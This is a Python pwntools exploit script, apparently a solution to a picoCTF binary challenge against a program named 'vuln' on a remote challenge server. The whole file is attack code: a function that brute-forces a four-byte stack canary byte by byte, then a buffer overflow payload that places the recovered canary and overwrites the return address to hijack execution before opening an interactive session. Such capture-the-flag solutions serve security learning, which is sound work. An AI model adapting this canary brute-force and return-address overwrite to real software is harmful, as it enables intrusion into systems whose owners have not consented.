from pwn import * 
import string
charactes = string.printable
exe = ELF("./vuln")

context.binary = exe
def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("saturn.picoctf.net", 54448)

    return r

def main():
	
	# input()
	# Find canary
	def find_canary(): 
		count = 0
		canary = b''
		while count < 4:
			for char in charactes:
				r = conn()
				test_canary = canary + char.encode()
				print(f"Test canary: {test_canary}")
				payload = b'A'*64 + test_canary
				offset = 65 + count
				r.sendlineafter(b'the Buffer?\n> ', str(offset).encode())
				r.sendlineafter(b'Input> ', payload)
				res = r.recvline()
				if b'Ok... Now Where\'s the Flag?' in res: 
					info(b"We found bytes!")
					canary += char.encode()
					count += 1
					break
				r.close()
		log.info(f'Canary: {canary.hex()}')
	r = conn()
	# Canary: BiRd
	input()
	payload = b'A'*64 + p32(0x64526942) + b'A'*16 + p32(0x0804933a)
	r.sendlineafter(b'the Buffer?\n> ', b'150')
	r.sendlineafter(b'Input> ', payload)
	res = r.recvline()
	
	pause()
	r.interactive()
if __name__ == "__main__":
	main()